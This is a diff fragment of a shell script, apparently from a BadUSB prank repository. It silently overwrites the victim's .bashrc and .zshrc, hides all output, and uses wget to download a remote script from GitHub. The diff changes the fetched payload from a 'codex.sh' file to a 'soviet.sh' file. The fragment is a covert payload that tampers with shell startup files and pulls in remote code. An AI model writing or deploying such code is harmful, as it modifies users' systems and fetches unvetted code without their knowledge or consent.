@@ -19,5 +19,5 @@ temp_file_zsh=$(mktemp)
     mv "$temp_file" "$bashrc"
     mv "$temp_file_zsh" "$zshrc"
     [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
-    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh" 
+    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/soviet/soviet.sh" 
 } >/dev/null 2>&1
